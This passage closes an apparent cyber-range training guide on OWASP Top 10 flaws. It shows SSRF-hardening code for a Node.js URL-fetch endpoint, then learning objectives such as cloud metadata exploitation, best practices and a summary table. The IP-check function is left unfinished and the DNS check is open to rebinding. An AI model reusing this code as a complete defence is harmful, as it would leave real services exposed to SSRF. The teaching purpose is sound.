  '192.168.0.0/16',   // Private network
  '169.254.0.0/16',   // Link-local
  '::1/128',          // IPv6 localhost
  'fc00::/7'          // IPv6 private
];

function isIPBlocked(ip) {
  // Check if IP is in blocked ranges
  // Use library like 'ip-range-check' or 'netmask'
  const ipaddr = require('ipaddr.js');
  
  try {
    const addr = ipaddr.process(ip);
    
    // Block private IPs
    if (addr.range() !== 'unicast') {
      return true;
    }
    
    // Block specific ranges
    // Implementation depends on your IP checking library
    return false;
  } catch (e) {
    return true; // Block invalid IPs
  }
}

app.get('/api/fetch-url', async (req, res) => {
  const { url } = req.query;
  
  if (!url) {
    return res.status(400).json({ 
      success: false, 
      message: 'URL parameter required' 
    });
  }
  
  try {
    // 3. Parse and validate URL
    const parsedUrl = new URL(url);
    
    // 4. Only allow HTTP/HTTPS
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      return res.status(400).json({ 
        success: false, 
        message: 'Only HTTP/HTTPS protocols allowed' 
      });
    }
    
    // 5. Check against whitelist
    if (!allowedDomains.includes(parsedUrl.hostname)) {
      return res.status(403).json({ 
        success: false, 
        message: 'Domain not allowed' 
      });
    }
    
    // 6. Resolve DNS and check IP
    const dns = require('dns').promises;
    const addresses = await dns.resolve4(parsedUrl.hostname);
    
    for (const ip of addresses) {
      if (isIPBlocked(ip)) {
        return res.status(403).json({ 
          success: false, 
          message: 'Access to internal resources not allowed' 
        });
      }
    }
    
    // 7. Make request with restrictions
    const response = await axios.get(url, {
      timeout: 3000,
      maxRedirects: 0,  // Don't follow redirects
      maxContentLength: 1000000, // 1MB max
      validateStatus: (status) => status < 400
    });
    
    // 8. Sanitize response (don't return full response)
    res.json({ 
      success: true, 
      status: response.status,
      contentType: response.headers['content-type'],
      // Only return specific, safe data
      // Don't return full response.data
    });
    
  } catch (error) {
    // Generic error message
    res.status(500).json({ 
      success: false, 
      message: 'Request failed' 
      // Don't expose error details
    });
  }
});
```

**Even Better - Remove the Endpoint:**
```javascript
// Best solution: Don't implement SSRF-prone functionality
// If you need to fetch external resources:
// 1. Do it server-side with hardcoded URLs
// 2. Use a proxy service
// 3. Implement strict whitelisting
```

### üéì Learning Objectives

- Understand SSRF attack vectors
- Learn about internal network reconnaissance
- Practice cloud metadata exploitation
- Understand protocol smuggling
- Learn about DNS rebinding
- Understand URL parsing vulnerabilities

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **CRITICAL** | Internal network access |
| Integrity | **HIGH** | Internal service manipulation |
| Availability | **MEDIUM** | Internal service DoS |
| **Overall Risk** | **CRITICAL** | Complete internal access |

### üîê Security Best Practices

1. **Avoid user-controlled URLs** - Don't implement if not needed
2. **Whitelist domains** - Only allow specific trusted domains
3. **Validate protocols** - Only HTTP/HTTPS
4. **Block private IPs** - Prevent internal network access
5. **Disable redirects** - Don't follow HTTP redirects
6. **DNS validation** - Resolve and check IP addresses
7. **Network segmentation** - Limit server's network access
8. **Monitor requests** - Log all outbound requests
9. **Timeout limits** - Prevent slow attacks
10. **Use proxy** - Route through controlled proxy

---

## Summary

This guide covered **7 major OWASP Top 10 vulnerabilities** demonstrated in the W Corp Cyber Range:

| Vulnerability | Risk Level | Key Takeaway |
|--------------|------------|--------------|
| **A01 - IDOR** | HIGH | Always verify authorization, not just authentication |
| **A02 - Crypto Failures** | CRITICAL | Never store plain text passwords - use bcrypt |
| **A03 - Injection** | HIGH | Never trust user input - validate everything |
| **A05 - Misconfig** | CRITICAL | Never expose configuration files or secrets |
| **A07 - Auth Failures** | HIGH | Implement rate limiting and strong password policies |
| **A08 - Integrity Failures** | HIGH | Validate file uploads - type, size, content |
| **A10 - SSRF** | CRITICAL | Whitelist domains, block internal IPs |

## üìö Additional Resources

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)

## üéì Next Steps

1. **Practice each vulnerability** in this cyber range
2. **Try combinations** - Chain vulnerabilities together
3. **Study the fixes** - Understand secure coding practices
4. **Build defenses** - Implement security controls
5. **Stay updated** - Security is constantly evolving

---

**Remember**: This cyber range is for educational purposes only. Always practice ethical hacking and obtain proper authorization before testing any systems.

¬© 2025 W Corp Cyber Range - Educational Security Training Platform
